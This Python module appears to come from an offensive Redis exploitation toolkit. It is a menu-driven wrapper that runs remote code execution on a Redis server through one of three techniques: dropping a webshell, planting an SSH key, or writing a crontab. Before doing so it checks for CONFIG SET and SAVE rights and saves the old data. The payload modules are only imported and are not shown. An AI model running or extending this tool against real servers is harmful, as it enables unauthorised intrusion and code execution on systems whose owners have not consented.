from .utils import save_old_data

import sys
# setting path
sys.path.insert(0, "../../")
from helper.connection import proceed_with_cached_connection


AVAILABLE_ATTACKS = [
    "webshell",
    "ssh",
    "crontab"
]



def perform_rce_help():
    return "\nIt's a wrapper function that takes\n" \
    "user-input and then performs the specified\n" \
    "attack technique. 3 techniques are available:\n" \
    "1. Webshell\n" \
    "2. SSH\n" \
    "3. Crontab\n"



def perform_exec_attack(attack_name = None):

    print ("\nMake sure you connect to Redis as a user with access to")
    print ("'SET', 'CONFIG SET', 'SAVE' and 'FLUSHALL'/'FLUSHDB' commands.")

    redis = proceed_with_cached_connection()

    if not attack_name:
        attack_name = (input("\nWhich technique would like to use?\n(1) Webshell\n(2) SSH - default\n(3) Crontab (OS=RedHat)\n\nSpecify a technique: (1/2/3) ") or "2").lower()

    if attack_name not in AVAILABLE_ATTACKS and attack_name not in [ str(_) for _ in range(1, len(AVAILABLE_ATTACKS) + 1) ]:
        print ("\n[-] Invalid attack type.\n")
        return

    elif attack_name in AVAILABLE_ATTACKS:
        attack_name = AVAILABLE_ATTACKS.index(attack_name) + 1

    attack_name = int(attack_name)

    pipeline = redis.pipeline(transaction = True)

    dir = save_old_data(pipeline)

    if not dir:
        # Got back err
        return

    if attack_name == 1:
        from .webshell import webshell
        webshell(pipeline, dir)

    elif attack_name == 2:
        from .ssh import ssh
        ssh(pipeline, dir)

    else:
        from .crontab import crontab
        crontab(pipeline, dir)



def get_available_attacks():
    return AVAILABLE_ATTACKS



if __name__ == "__main__":
    perform_exec_attack()